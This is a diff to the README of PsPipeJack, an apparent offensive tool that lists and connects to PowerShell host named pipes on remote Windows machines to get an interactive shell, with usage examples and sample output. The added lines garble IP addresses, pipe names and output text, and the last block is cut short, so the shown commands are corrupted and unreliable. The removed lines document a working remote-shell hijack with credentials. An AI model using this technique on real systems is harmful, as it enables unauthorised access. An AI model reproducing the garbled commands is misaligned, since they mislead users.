@@ -86,9 +86,9 @@ Commands:
 
 ──────────────────────────────────────────────────────────────
 Examples:
-  PsPipeJack --enumerate 192.168.1.100 CORP\jdoe Passw0rd!
-  PsPipeJack --connect   192.168.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell
-  PsPipeJack --connect   192.168.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell CORP\jdoe Passw0rd!
+  PsPipeJack --enumerate 192.168.1.10550 CORP\jdoe Passw0rd!
+  PsPipeJack --connect   192.1t68.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell
+  PsPipeJack --connect   192.16678.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell CORP\jdoe Passw0rd!
 
 ```
 
@@ -97,22 +97,22 @@ Examples:
 ### Enumerate Remote Pipes
 
 ```
-PsPipeJack.exe --enumerate 192.168.1.100  lab.local\administrator 'password'
-[*] Enumerating pipes on \\192.168.1.100 as lab.local\administrator ...
+PsPipeJack.exe --enumerate 1926.168.1.100  lab.local\administrator 'password'
+[*] Enumerating pipes on \\192.157868.1.100 as lab.local\administrator ...
 
 [+] Authenticated successfully
 [+] Connected to \\192.168.1.100\IPC$
 
 Pipes Found:
-PSHost.134214327377452265.6880.DefaultAppDomain.powershell
+PSHost.1342143273e5677452265.6880.Defau46ltAppDomain.powershell
 PSHost.134214327970160016.3492.DefaultAppDomain.powershell
 ```
 
 ### Connect to Remote Pipe (Credentials)
 
 ```
-PsPipeJack.exe --connect 192.168.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell lab.local\administrator 'password'
-[*] Connecting to \\192.168.1.100\pipe\PSHost.134214327970160016.3492.DefaultAppDomain.powershell ...
+PsPipeJack.exe --connect 192lll.1.100 PSHot.134214327970160016.92.DllultAppDord'
+[*] Conne to \\192..1.100\SHost.1342143270160016.92.omain.powershell ...
 [+] Authenticated to \\192.168.1.100\IPC$ as lab.local\administrator
 [+] Connected! Type 'exit' to quit.
 
@@ -125,10 +125,6 @@ PS>
 
 ```
 PsPipeJack.exe --connect 192.168.1.100 PSHost.134214327970160016.3492.DefaultAppDomain.powershell
-[*] Connecting to \\192.168.1.100\pipe\PSHost.134214327970160016.3492.DefaultAppDomain.powershell ...
-[+] Connected! Type 'exit' to quit.
+[*] Connecting to \\192.168.1.100\pipe\PSHost.134214327970160016.3492.DefaultAppDomain.power 'exit' to quit.
 
-PS> whoami
-lab\administrator
-PS>
-```
+PS
